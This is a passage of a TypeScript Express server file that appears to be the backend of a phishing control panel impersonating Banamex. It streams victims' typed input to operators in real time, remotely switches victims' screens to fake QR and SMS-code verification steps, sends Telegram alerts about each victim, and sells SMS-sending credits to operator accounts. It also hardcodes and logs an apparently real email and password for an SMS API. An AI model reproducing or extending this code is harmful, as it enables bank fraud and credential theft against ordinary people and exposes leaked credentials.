                  type: 'QR_RECEIVED',
                  data: { 
                    sessionId,
                    qrImage: inputData.qrImage,
                    phone: sessionData?.celular,
                    timestamp: new Date().toISOString(),
                    createdBy: qrCreatedBy
                  }
                }), qrCreatedBy);

                // Enviar notificación por Telegram
                const qrTelegramMessage = `🔍 <b>Nuevo QR recibido para validación</b>\n\n` +
                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                  `📞 <b>Teléfono:</b> ${sessionData?.celular || 'No proporcionado'}\n` +
                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n\n` +
                  `Un cliente ha enviado su código QR para validación de AirPods Pro Max.`;

                sendTelegramMessage(qrTelegramMessage);
                break;
            }

            console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);

            // Enviar notificación en tiempo real de la entrada del cliente
            // Obtenemos la sesión para saber quién la creó y enviarle la notificación
            const session = await storage.getSessionById(sessionId);
            const createdBy = session?.createdBy || '';

            broadcastToAdmins(JSON.stringify({
              type: 'CLIENT_INPUT_REALTIME',
              data: {
                sessionId,
                tipo,
                inputData,
                timestamp: new Date().toISOString(),
                createdBy // Añadimos el creador para referencia
              }
            }), createdBy); // Dirigimos el mensaje al creador de la sesión

            // Update session if we have fields to update
            if (Object.keys(updatedFields).length > 0) {
              const updatedSession = await storage.updateSession(sessionId, updatedFields);

              // Notify specific admin clients about the database update
              // Enviamos el mensaje al creador de la sesión
              const createdBy = updatedSession?.createdBy || '';
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }), createdBy); // Dirigimos el mensaje al creador de la sesión

              // Si el tipo es acceso_denegado o datos_contacto, enviar SCREEN_CHANGE a MENSAJE
              if (tipo === 'acceso_denegado' || tipo === 'datos_contacto') {
                const client = clients.get(sessionId);
                if (client && client.readyState === WebSocket.OPEN) {
                  client.send(JSON.stringify({
                    type: 'SCREEN_CHANGE',
                    data: {
                      tipo: 'mensaje',
                      sessionId: sessionId,
                      mensaje: 'En breve un ejecutivo se pondrá en contacto contigo'
                    }
                  }));
                }
              }
            }
          } catch (error) {
            console.error("Invalid client input data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid client input data" 
            }));
          }
          return;
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    });

    // Handle disconnection
    ws.on('close', () => {
      // Buscar y eliminar el cliente del adminClients Map
      let adminUserRemoved = false;

      // Iteramos sobre el Map usando entradas como array
      const adminEntries = Array.from(adminClients.entries());
      for (let i = 0; i < adminEntries.length; i++) {
        const [username, client] = adminEntries[i];
        if (client === ws) {
          adminClients.delete(username);
          console.log(`Admin client disconnected: ${username}`);
          adminUserRemoved = true;
          break; // Terminamos el bucle una vez encontrado
        }
      }

      // Si no era un cliente admin, revisamos si era un cliente regular
      if (!adminUserRemoved) {
        // Buscar y eliminar de clients si era un cliente
        const clientEntries = Array.from(clients.entries());
        for (let i = 0; i < clientEntries.length; i++) {
          const [sessionId, client] = clientEntries[i];
          if (client === ws) {
            clients.delete(sessionId);
            console.log(`Client with session ID ${sessionId} disconnected`);
            break; // Terminamos el bucle una vez encontrado
          }
        }
      }
    });
  });

  // === API de SMS ===

  // Obtener la configuración actual de la API de SMS
  app.get('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const config = await storage.getSmsConfig();
      // Si hay una config, ocultamos las credenciales por seguridad, solo mostramos si están activas
      if (config) {
        res.json({
          isActive: config.isActive,
          updatedAt: config.updatedAt,
          updatedBy: config.updatedBy,
          hasCredentials: !!(config.username && config.password), // Verificar si hay credenciales configuradas
          hasToken: !!config.authToken, // Verificar si hay token JWT configurado
          apiUrl: config.apiUrl || 'https://www.sofmex.com/api/sms'
        });
      } else {
        res.json({
          isActive: false,
          hasCredentials: false,
          hasToken: false,
          apiUrl: 'https://www.sofmex.com/api/sms',
          updatedAt: null,
          updatedBy: null
        });
      }
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Actualizar la configuración de la API de SMS
  app.post('/api/sms/config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      // Solo usuario administrador puede actualizar la configuración
      if (user.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden actualizar la configuración de API" });
      }

      // Verificamos si es un modo de simulación
      const apiUrl = req.body.apiUrl || 'https://www.sofmex.com/sms/v3/asignacion';
      const simulationMode = apiUrl && (apiUrl.includes('simulacion') || apiUrl.includes('localhost'));

      // Obtener credenciales del frontend
      const username = req.body.username || 'josemorenofs19@gmail.com';
      const password = req.body.password || 'Balon19@';

      // No almacenamos token JWT porque lo obtendremos dinámicamente en cada solicitud
      const authToken = '';

      // La API está activa si está en modo simulación o si tiene credenciales válidas
      const hasValidCredentials = simulationMode || (!!username && !!password);
      const isActive = hasValidCredentials;

      // Si no estamos en modo simulación y faltan credenciales, advertimos pero seguimos
      let credentialsWarning = '';
      if (!simulationMode && (!username || !password)) {
        credentialsWarning = "Advertencia: No has proporcionado credenciales válidas para el modo real.";
      }

      console.log(`Configurando API SOFMEX con usuario: ${username}, URL: ${apiUrl}, Simulación: ${simulationMode}`)

      const data = insertSmsConfigSchema.parse({
        username: username,
        password: password,
        apiUrl: apiUrl,
        authToken: authToken,
        isActive: isActive,
        updatedBy: user.username
      });

      const config = await storage.updateSmsConfig(data);

      // Respuesta adicional para el modo simulación
      const response: {
        isActive: boolean | null;
        updatedAt: Date | null;
        updatedBy: string;
        hasCredentials: boolean;
        hasToken: boolean;
        apiUrl: string | null;
        success: boolean;
        message?: string;
      } = {
        isActive: config.isActive,
        updatedAt: config.updatedAt,
        updatedBy: config.updatedBy,
        hasCredentials: !!username && !!password,
        hasToken: !!authToken,
        apiUrl: config.apiUrl,
        success: true
      };

      if (simulationMode) {
        console.log("API de SMS configurada en modo simulación:", config.apiUrl);
        response.message = "API configurada en modo simulación. Los mensajes serán enviados solo de manera simulada.";
      }

      res.json(response);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener los créditos SMS del usuario actual
  app.get('/api/sms/credits', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const credits = await storage.getUserSmsCredits(user.id);
      res.json({ credits });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Agregar créditos a un usuario (solo admin)
  app.post('/api/sms/credits/:userId', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user;
      // Solo administradores pueden agregar créditos
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden agregar créditos" });
      }

      const userId = parseInt(req.params.userId);
      const { amount } = req.body;

      if (!amount || amount <= 0) {
        return res.status(400).json({ message: "La cantidad debe ser un número positivo" });
      }

      const smsCredits = await storage.addSmsCredits(userId, amount);
      res.json({
        success: true,
        credits: smsCredits.credits,
        message: `Se han agregado ${amount} créditos. Total: ${smsCredits.credits}`
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Enviar un SMS
  app.post('/api/sms/send', async (req, res) => {
    try {
      console.log("Recibida solicitud de envío de SMS");

      if (!req.isAuthenticated()) {
        console.log("Error: Usuario no autenticado");
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      console.log(`Usuario: ${user.username}, Role: ${user.role}`);

      // Verificar si el usuario tiene créditos (solo para usuarios regulares)
      // Los administradores no necesitan créditos para enviar SMS
      if (user.role !== UserRole.ADMIN) {
        const hasCredits = await storage.useSmsCredit(user.id);
        if (!hasCredits) {
          return res.status(400).json({ 
            success: false, 
            message: "No tienes créditos suficientes para enviar un SMS" 
          });
        }
      }

      // Validar los datos del SMS
      const { phoneNumber, message, sessionId } = req.body;

      console.log("Datos de SMS a enviar:", { phoneNumber, messageLength: message?.length || 0, sessionId });

      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: "Se requiere número de teléfono" 
        });
      }

      // Permitir mensaje vacío para mayor flexibilidad
      const messageContent = message || "Mensaje de prueba";

      // Preparar los datos para el historial
      const smsData = insertSmsHistorySchema.parse({
        userId: user.id,
        phoneNumber,
        message: messageContent,
        sessionId: sessionId || null
      });

      // Guardar en el historial como pendiente
      const smsRecord = await storage.addSmsToHistory(smsData);

      // Obtener la configuración actual de SMS
      const smsConfig = await storage.getSmsConfig();

      // Usar la API en producción
      console.log(`Enviando SMS con SOFMEX API (URL: ${smsConfig?.apiUrl || 'usando URL predeterminada'})`);

      // Implementación de envío de SMS
      try {
        console.log("Iniciando proceso de envío con SOFMEX API");

        // Obtener credenciales guardadas en la configuración
        const username = smsConfig?.username || 'josemorenofs19@gmail.com';
        const password = smsConfig?.password || 'Balon19@';

        // URLs base de la API según la documentación actualizada
        const baseApiUrl = 'https://api.sofmex.com';
        const loginUrl = `${baseApiUrl}/authenticate`; // URL de autenticación
        const smsApiUrl = smsConfig?.apiUrl || `${baseApiUrl}/sms/v3/asignacion`; // URL de la API v3 para enviar SMS

        console.log(`Usando credenciales: ${username}, API URLs: Login ${loginUrl}, SMS ${smsApiUrl}`);

        // Paso 1: Obtener token con credenciales
        console.log("Obteniendo token de autenticación");

        // Formato según la documentación de la API
        const loginResponse = await axios.post(loginUrl, {
          username: username,
          password: password
        }, {
          headers: {
            'Content-Type': 'application/json'
          },
          timeout: 10000
        });

        console.log("Respuesta de login:", {
          status: loginResponse.status,
          statusText: loginResponse.statusText,
          data: loginResponse.data
        });

        // Verificamos la respuesta del servidor
        // Si hay algún error de autenticación, lo manejamos
        if (loginResponse.status !== 200) {
          throw new Error(`Error de autenticación: ${JSON.stringify(loginResponse.data)}`);
        }

        // Extraer token de la respuesta según documentación
        const token = loginResponse.data.token || loginResponse.data.access_token;
        if (!token) {
          console.error("No se pudo obtener token de autenticación:", loginResponse.data);
          throw new Error("No se pudo obtener token de autenticación");
        }
        console.log("Token obtenido correctamente");

        // Paso 2: Enviar SMS con token según la documentación
        const smsBody = {
          registros: [
            {
              telefono: phoneNumber,
              mensaje: messageContent
            }
          ]
        };

        console.log("Enviando solicitud a SMS API:", {
          url: smsApiUrl,
          phone: phoneNumber,
          messageLength: messageContent.length
        });

        const smsResponse = await axios.post(smsApiUrl, smsBody, {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
          },
          timeout: 10000
        });

        console.log("Respuesta de SMS API:", {
          status: smsResponse.status,
          data: smsResponse.data
        });

        // Verificar respuesta según documentación de la API
        // La respuesta puede contener diferentes formatos según la versión de la API
        console.log("Analizando respuesta de API:", smsResponse.data);

        if (smsResponse.status === 200 || smsResponse.status === 201) {
          // Verificar si hay errores específicos en la respuesta
          const responseData = smsResponse.data;
          // Verificación de éxito en la respuesta según diferentes posibles formatos
          let isSuccess = false;

          if (responseData.success === true) {
            isSuccess = true;
          } else if (responseData.status === 'success') {
            isSuccess = true;
          } else if (responseData.codigo === 200) {
            isSuccess = true;
          } else if (Array.isArray(responseData.resultados)) {
            // Verificar si al menos un registro fue enviado correctamente
            for (let i = 0; i < responseData.resultados.length; i++) {
              const resultado = responseData.resultados[i];
              if (resultado && resultado.estatus === "ENVIADO") {
                isSuccess = true;
                break;
              }
            }
          }

          if (isSuccess) {
            // Actualizar el registro como enviado
            await storage.updateSmsStatus(smsRecord.id, 'sent');

            return res.json({
              success: true,
              message: "Mensaje enviado correctamente",
              smsId: smsRecord.id,
              apiResponse: smsResponse.data
            });
          } else {
            // Error en la respuesta a pesar de status 200
            let errorMsg = "Error al procesar el envío";

            if (responseData.message) {
              errorMsg = responseData.message;
            } else if (responseData.mensaje) {
              errorMsg = responseData.mensaje;
            } else if (responseData.error) {
              errorMsg = responseData.error;
            } else if (Array.isArray(responseData.resultados) && responseData.resultados[0] && responseData.resultados[0].error) {
              errorMsg = responseData.resultados[0].error;
            }

            await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);

            return res.status(400).json({
              success: false,
              message: `Error en API de SMS: ${errorMsg}`,
              smsId: smsRecord.id
            });
          }
        } else {
          // Error en el procesamiento del SMS basado en status HTTP
          const errorMsg = 
            smsResponse.data.message || 
            smsResponse.data.mensaje || 
            smsResponse.data.error || 
            "Error al procesar el envío";

          await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);

          return res.status(400).json({
            success: false,
            message: `Error en API de SMS: ${errorMsg}`,
            smsId: smsRecord.id
          });
        }
      } catch (error: any) {
        // Error en la comunicación con la API
        const errorMsg = error.message || "Error de conexión con la API";
        await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);

        console.error("Error al enviar SMS:", errorMsg);
        return res.status(500).json({
          success: false, 
          message: `Error: ${errorMsg}`,
          smsId: smsRecord.id
        });
      }
    } catch (error: any) {
      console.error("Error general en envío de SMS:", error);
      res.status(500).json({ 
        success: false, 
        message: `Error general: ${error.message}`
      });
    }
  });

  // Obtener historial de SMS enviados
  app.get('/api/sms/history', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const history = await storage.getUserSmsHistory(user.id);

      res.json(history);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener todos los usuarios regulares (para agregar créditos)
  app.get('/api/users/regular', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user;
      // Solo administradores pueden ver la lista de usuarios
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden ver la lista de usuarios" });
      }

      const users = await storage.getAllUsers();
      // Filtrar administradores y enviar solo datos básicos
      const regularUsers = users.filter(user => user.role === UserRole.USER).map(user => ({
        id: user.id,
        username: user.username,
        isActive: user.isActive,
        expiresAt: user.expiresAt,
        credits: 0 // El frontend tendrá que cargar los créditos aparte
      }));

      res.json(regularUsers);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // API endpoint para validar QR
  app.post('/api/sessions/:sessionId/validate-qr', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const { sessionId } = req.params;
      const { approved, reason } = req.body;

      const session = await storage.getSessionById(sessionId);
      if (!session) {
        return res.status(404).json({ message: "Sesión no encontrada" });
      }

      // Actualizar el estado de validación del QR
      const updatedSession = await storage.updateSession(sessionId, {
        qrValidated: approved,
        pasoActual: approved ? ScreenType.SMS_VERIFICATION : ScreenType.QR_VALIDATION
      });

      // Notificar al cliente sobre el resultado
      const client = clients.get(sessionId);
      if (client && client.readyState === WebSocket.OPEN) {
        if (approved) {
          // Si se aprueba, cambiar a la pantalla de verificación SMS
          client.send(JSON.stringify({
            type: 'SCREEN_CHANGE',
            data: {
              tipo: 'mostrar_sms_verification',
              terminacion: session.celular ? session.celular.slice(-4) : '2390',
              mensaje: 'QR validado correctamente. Ahora verifica tu código SMS.'
            }
          }));
        } else {
          // Si se rechaza, mantener en QR_VALIDATION con mensaje de error
          client.send(JSON.stringify({
            type: 'QR_VALIDATION_RESULT',
            data: {
              approved: false,
              reason: reason || 'QR no válido'
            }
          }));
        }
      }

      // Notificar a administradores
      broadcastToAdmins(JSON.stringify({
        type: 'QR_VALIDATED',
        data: {
          sessionId,
          approved,
          reason,
          validatedBy: req.user.username,
          timestamp: new Date().toISOString()
        }
      }));

      // Enviar notificación por Telegram
      const validationMessage = approved 
        ? `✅ <b>QR APROBADO</b>\n\n📋 <b>Folio:</b> ${session.folio}\n👤 <b>Validado por:</b> ${req.user.username}\n⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`
        : `❌ <b>QR RECHAZADO</b>\n\n📋 <b>Folio:</b> ${session.folio}\n👤 <b>Rechazado por:</b> ${req.user.username}\n📝 <b>Razón:</b> ${reason || 'No especificada'}\n⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;

      sendTelegramMessage(validationMessage);

      res.json({ success: true, session: updatedSession });
    } catch (error: any) {
      console.error('Error validating QR:', error);
      res.status(500).json({ message: error.message });
    }
  });

  return httpServer;
}

// Helper function to broadcast to admin clients, with option to target specific users
function broadcastToAdmins(message: string, targetUsername?: string) {
  // Intentar parsear el mensaje para logging y extraer información
  try {
    const parsedMessage = JSON.parse(message);
    console.log(`[Broadcast] Enviando mensaje de tipo: ${parsedMessage.type}`);

    // Si el mensaje se refiere a una sesión, intentamos obtener el creador
    if (parsedMessage.data && parsedMessage.data.createdBy && !targetUsername) {
      // Solo establecer targetUsername si el creador es un usuario real (no "banamex_client" u otros identificadores ficticios)
      if (parsedMessage.data.createdBy !== 'banamex_client' && parsedMessage.data.createdBy !== 'sistema') {
        targetUsername = parsedMessage.data.createdBy;
        console.log(`[Broadcast] Estableciendo targetUsername a ${targetUsername} basado en createdBy`);
      } else {
        console.log(`[Broadcast] Sesión de ${parsedMessage.data.createdBy}, enviando a todos los administradores`);
      }
    }
  } catch (e) {
    console.log(`[Broadcast] Enviando mensaje (formato no JSON)`);
  }

  // Si se especifica un usuario objetivo, enviamos el mensaje solo a ese usuario y a todos los administradores
  let sentCount = 0;

  if (targetUsername) {
    // Buscar el cliente del usuario objetivo y los administradores
    const entries = Array.from(adminClients.entries());
    for (let i = 0; i < entries.length; i++) {
      const [username, client] = entries[i];

      // Consideramos que cualquier usuario que está conectado como admin debe ser un admin, y también envíamos al usuario que creó
      if ((username === targetUsername || username === 'balonx' || username === 'yako') && client.readyState === WebSocket.OPEN) {
        client.send(message);
        sentCount++;
        console.log(`[Broadcast] Mensaje enviado específicamente a ${username}`);
      }
    }
  } else {
    // Comportamiento original: broadcast a todos los administradores conectados
    const entries = Array.from(adminClients.entries());
    for (let i = 0; i < entries.length; i++) {
      const [username, client] = entries[i];
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
        sentCount++;
      }
    }
  }

  console.log(`[Broadcast] Mensaje enviado a ${sentCount} clientes administradores`);
}